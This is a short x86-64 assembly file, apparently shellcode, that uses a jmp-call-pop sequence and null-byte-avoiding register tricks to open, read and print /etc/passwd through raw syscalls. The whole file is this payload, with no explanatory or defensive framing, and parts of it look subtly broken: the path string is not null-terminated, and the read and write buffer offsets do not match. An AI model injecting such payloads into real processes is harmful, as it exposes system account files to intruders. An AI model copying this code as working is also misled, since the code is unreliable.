	.global _start

	.text

_start:
	jmp path

goback:
	# open(/etc/passwd)
	xor	%rax, %rax
	addb	$2, %al
	#push	$path
	pop	%rdi
	xor	%rsi, %rsi
	syscall

	# read(/etc/passwd)
	mov	%rax, %rdi
	sub	$0xfff, %sp
	lea	0x08(%rsp), %rsi
	xor	%rdx, %rdx
	addb	$0xff, %dl
	xor 	%rax, %rax
	syscall

	# write(/etc/passwd)
	xor	%rax, %rax
	inc	%rax			# system call 1 is write
	mov	%rax, %rdi		# file handle 1 is stdout
	mov	%rsp, %rsi
        xor	%rdx, %rdx
	addb	$0xff, %dl		# number of bytes
        syscall

	# exit(0)
	xor	%rax, %rax
	addb	$60, %al
	xor	%rdi, %rdi
	syscall

path:
	call goback
	.ascii	"/etc/passwd"
